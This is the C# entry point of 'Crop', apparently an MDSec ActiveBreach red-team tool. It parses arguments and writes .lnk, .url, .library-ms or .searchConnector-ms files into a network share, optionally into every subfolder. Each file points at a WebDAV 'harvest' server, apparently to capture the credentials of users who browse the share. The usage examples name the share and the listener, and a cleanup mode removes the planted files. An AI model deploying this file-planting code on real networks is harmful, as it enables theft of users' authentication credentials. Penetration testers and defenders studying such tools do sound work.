using System;
using System.Linq;
using System.IO;

namespace Crop
{
    class Program
    {
        static void ShowBanner()
        {
            Console.WriteLine(Config.banner);
            Console.WriteLine("Author: @domchell - MDSec ActiveBreach\n");
        }
        static void ShowHelp()
        {
            ShowBanner();

            Console.WriteLine("LNK File:");
            Console.WriteLine("crop.exe <output folder> <output filename> <WebDAV server> <LNK value> [options]");
            Console.WriteLine("crop.exe \\\\fileserver\\Common\\ crop.lnk \\\\workstation@8888\\harvest \\\\workstation@8888\\harvest");
            Console.WriteLine("\nOther formats:");
            Console.WriteLine("Support extensions: .url, .library-ms, .searchConnector-ms");
            Console.WriteLine("crop.exe <output folder> <output filename> <WebDAV server> [options]");
            Console.WriteLine("crop.exe \\\\fileserver\\Common\\ crop.url \\\\workstation@8888\\harvest");
            Console.WriteLine("\nOptional arguments:");
            Console.WriteLine("--recurse : write the file to every sub folder of the specified path");
            Console.WriteLine("--depth=X : number of sub folders deep of the specified path to write the file");
            Console.WriteLine("--clean : remove the file from every sub folder of the specified path");
            return;
        }
        static void ParseArgs(string[] args)
        {
            var recurse = false;
            var clean = false;
            var maxDepth = -1;
            if (args.Contains("--recurse"))
                recurse = true;
            else if (args.Contains("--clean"))
                clean = true;
            
            if (Array.Exists(args,  x => x.Contains("--depth=")))
            {
                if (!Int32.TryParse(args.Where(s => s.Contains("--depth=")).First().Split('=')[1], out maxDepth)) {
                    ShowHelp();
                    return;
                }
            }

            Config.targetLocation = args[0].Trim();
            Config.targetFilename = args[1].Trim();
            Config.targetPath = args[2].Trim();

            if(!Config.targetLocation.EndsWith("\\"))
                Config.targetLocation = Config.targetLocation + "\\";

            if (Config.targetFilename.EndsWith(".lnk"))
            {
                if (args.Length < 4)
                {
                    ShowHelp();
                    return;
                }
                Config.targetIcon = args[3].Trim();

                Console.WriteLine("[*] Setting LNK value: {0}", Config.targetPath);
                Console.WriteLine("[*] Icon location: {0}", Config.targetIcon);

                try
                {
                    if (recurse)
                    {
                        Config.WalkDirectoryTree(Config.targetLocation, maxDepth);
                        foreach (var folder in Config.folders)
                        {
                            var f = folder;
                            if (!folder.EndsWith("\\"))
                                f = folder + "\\";
                            var output = f + Config.targetFilename;
                            Console.WriteLine("[*] Writing LNK to: {0}", output);
                            Crop.CreateLNKCrop(output);
                        }
                    }
                    else if (clean)
                    {
                        Config.WalkDirectoryTree(Config.targetLocation, maxDepth);
                        foreach (var folder in Config.folders)
                        {
                            var f = folder;
                            if (!folder.EndsWith("\\"))
                                f = folder + "\\";
                            if (File.Exists(f + Config.targetFilename))
                            {
                                File.Delete(f + Config.targetFilename);
                                Console.WriteLine("[*] Removing file: {0}", f + Config.targetFilename);
                            }
                        }
                    }
                    else
                    {
                        var output = Config.targetLocation + Config.targetFilename;
                        Console.WriteLine("[*] Writing LNK to: {0}", output);
                        Crop.CreateLNKCrop(output);
                    }
                }
                catch (Exception e)
                {
                    Console.WriteLine(e.Message);
                }
            }
            else if (Config.targetFilename.ToLower().EndsWith(".url") || Config.targetFilename.ToLower().EndsWith(".library-ms") || Config.targetFilename.ToLower().EndsWith(".searchconnector-ms"))
            {
                Console.WriteLine("[*] Setting WebDAV value: {0}", Config.targetPath);

                try
                {

                    if (recurse)
                    {
                        Config.WalkDirectoryTree(Config.targetLocation, maxDepth);
                        foreach (var folder in Config.folders)
                        {
                            var f = folder;
                            if (!folder.EndsWith("\\"))
                                f = folder + "\\";
                            var output = f + Config.targetFilename;
                            Console.WriteLine("[*] Writing file to: {0}", output);
                            Crop.CreateFileCrop(output);
                        }
                    }
                    else if (clean)
                    {
                        Config.WalkDirectoryTree(Config.targetLocation, maxDepth);
                        foreach (var folder in Config.folders)
                        {
                            var f = folder;
                            if (!folder.EndsWith("\\"))
                                f = folder + "\\";
                            if (File.Exists(f + Config.targetFilename))
                            {
                                File.Delete(f + Config.targetFilename);
                                Console.WriteLine("[*] Removing file: {0}", f + Config.targetFilename);
                            }
                        }
                    }
                    else
                    {
                        var output = Config.targetLocation + Config.targetFilename;
                        Console.WriteLine("[*] Writing file to: {0}", output);
                        Crop.CreateFileCrop(output);
                    }
                }
                catch (Exception e)
                {
                    Console.WriteLine(e.Message);
                }
            }
        }

        static void Main(string[] args)
        {
            if (args.Length < 3)
            {
                ShowHelp();
                return;
            }

            ShowBanner();
            ParseArgs(args);

        }
    }
}
